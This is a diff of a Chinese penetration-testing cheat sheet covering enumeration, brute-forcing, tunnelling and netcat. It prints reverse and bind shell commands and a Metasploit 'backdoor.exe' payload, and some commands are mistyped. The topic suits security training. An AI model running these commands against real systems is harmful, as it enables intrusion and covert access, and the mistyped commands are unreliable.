@@ -37,15 +37,10 @@ Pentoo: A livecd based on Gentoo and XFCE. Also available as an overlay for exis
 
 传统的本地dns探测工具，多数依赖于字典文件：
 
-    
+
     dnsenum.pl -f dns_list.txt --dnserver 8.8.8.8 cisco.com -o cisco.list
 
-
-
-    
     dnsmap cisco.com -w wordlist.txt -c cisco.csv
-
-
 
 
 路由信息收集工具，一个传统的udp实现，一个现代一点的利用tcp实现，可以穿越防火墙。
@@ -74,28 +69,17 @@ site:jlxy.nju.edu.cn intext:admin
 
 发现主机
 
-    
+
     arping -c 2 192.168.1.1
 
-
-
-    
     fping -s -r 1 192.168.1.1 192.168.1.254
 
-
-
-    
     hping3 -c 2 192.168.1.1
 
 
-
-    
     #hping3
     hping>hping send {ip(addr=192.168.1.1)+icmp(type=8,code=0)}
 
-
-
-    
     nbtscan 192.168.1.1-254
 
 
@@ -114,19 +98,15 @@ scanrand:一个非常快速、无状态的 TCP 端口扫描器和 traceroute 工
 
 服务探测
 
-    
+
     cd /pentest/enumeration/www/httprint/linux/
     httprint -h 192.168.1.1 -s singnature.txt
 
 
 VPN探测
 
-    
     ike-scan -M -v 192.168.1.1
 
-
-
-    
     sslscan 192.168.1.1
 
 
@@ -139,26 +119,26 @@ Cisco tools
 
 cisco auditing tool
 
-    
+
     ./CAT -h 192.182.1.1 -w lists/community -a lists/passwords -I
 
 
 Cisco passwd scanner
 
-    
+
     ./cisco 10.10.10 3 -t 4 -C 10
 
 
 Snmp tools
 
-    
+
     cd /pentest/enumeration/snmp/admsnmp
     ./ADMsnmp 192.168.1.1 -wordf wordlist.list
 
 
 如果你知道snmp的community， 你可以使用这个工具收集信息。
 
-    
+
     cd  /pentest/enumeration/snmp/snmpenum/
     ./snmpenum 192.168.1.1 private windows.txt
 
@@ -168,7 +148,7 @@ Burp suite
 
 Nikto
 
-    
+
     ./nikto.pl -h 192.168.1.1 -C -p 80 T3487b -t 3 -D \V  -o webtest -F htm
 
 
@@ -176,7 +156,7 @@ W3af
 
 这个waf的探测工具：WAFW00F
 
-    
+
     cd /pentest/web/waffit/
     ./wafw00f http://....
 
@@ -185,15 +165,11 @@ W3af
 
 
 ### 集成化的工具包
-
-
-SET
-
 MSF
 
-    
+
     msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.150 LPORT=4444 X > backdoor.exe
-    
+
     msfconsole
     use exploit/multi/hander
     set PAYLOAD windows/meterpreter/reverse_tcp
@@ -201,17 +177,14 @@ MSF
     set LHOST 4444
 
 
-
-
-
 ### 局域网安全
 
 
-Layer 2:
+####Layer 2:
 CDP(cisco discovery protocols)
 mac flood
 
-Layer 3:
+####Layer 3:
 dhcp
 tcp syn flood
 
@@ -237,19 +210,19 @@ Web 表单
 Dns 隧道
 Server:dns2tcpd
 
-    
+
     ./dns2tcpd -F -d 1 -f dns2tcpd.conf
 
 
 Client:
 
-    
+
     ./dns2tcpc  -z  domain.org
 
 
 配置文件：
 
-    
+
     Domain=domain.org
     Rescoure = ssh
     Local_port = 2222
@@ -259,13 +232,12 @@ Client:
 icmp 隧道
 Server:
 
-    
     ./ptunnel
 
 
 Client:
 
-    
+
     ./ptunnel -p tun.ser_ip -lp 2222 -da ture.ip  -dp 22
 
 
@@ -273,29 +245,20 @@ Client:
 netcat
 Windows:
 
-    
     nc.exe -d -L -p 1234 -e cmd.exe
-
 
 Remote:
 
-    
     nc -l -p 1234
-
 
 locale:
 
-    
     nc -d remore port -e cmd.exe
-
 
 Nc realy:（利用脚本实现），就是一种重定向，指定的数据流转发，还可以把传输的信息dump一次。
 
-    
+
     #/bin/bash
     nc -o output.file ip_addr port
 
-
-
-    
     nc -l -p 23 -e script.sh
